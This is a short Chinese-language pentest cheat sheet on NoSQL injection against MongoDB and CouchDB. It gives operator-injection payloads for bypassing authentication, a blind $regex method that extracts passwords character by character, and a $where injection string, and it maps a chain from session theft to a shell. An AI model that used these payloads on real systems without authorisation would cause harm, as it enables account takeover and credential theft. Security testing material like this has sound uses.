# NoSQL 注入

JWT → `jwt.md`。PHP/.NET 反序列化 → `deserialization.md`。Java → `java-deserialization.md`。

## NoSQL注入

场景：后端MongoDB/CouchDB。登录框、搜索、过滤参数是主要注入点。

### 认证绕过

```json
// 已知用户名
{"user":"admin","pass":{"$ne":null}}

// 连用户名都不知道
{"user":{"$gt":""},"pass":{"$gt":""}}
```

```
// 表单/GET形式
user[$ne]=1&pass[$ne]=1
```

务必设 Content-Type: application/json，否则操作符被当普通字符串。

### 盲注提取数据

```json
{"user":"admin","pass":{"$regex":"^a"}}     // 首字符是a?
{"user":"admin","pass":{"$regex":"^ab"}}    // 前两位是ab?
// 逐位枚举拼出完整密码
```

自动化：nosqlmap

### $where代码注入

```json
{"$where":"this.pass=='x'||'1'=='1'"}
```

---

## 现代 Java JSON / 反序列化路由

本文件只保留通用识别。发现以下信号时转：**java-deserialization.md**

```text
Java serialized object (AC ED 00 05 / rO0AB)
Jackson polymorphic type / @class / @type
Fastjson 1.x / @type
Java框架错误栈暴露具体依赖
```

尤其是 Fastjson 1.x CVE-2026-16723：产品/版本/部署条件候选先由 `/web-recon` 的 CVE/PoC 流程确认；确认是通用反序列化 sink 再进入 `java-deserialization.md`。

---

## MongoDB `$where` 注意

`$where` / `$function` 属于 MongoDB **服务端 JavaScript**，不是 Node.js runtime：

```text
不能因为语法是JavaScript就直接使用：
require('child_process').exec(...)
```

这类 Node.js `require()` 链不应写成 MongoDB 通用 RCE。

在 NoSQLi 中优先目标仍然是：

```text
operator injection
→ auth bypass
→ boolean/regex oracle
→ sensitive data / token / admin session
→ 再寻找Web层可到Shell的组合点
```

MongoDB 8.x 已把部分 server-side JavaScript 能力标为 deprecated；测试时按版本和实际配置判断，不要把 `$where` 当永远可用。
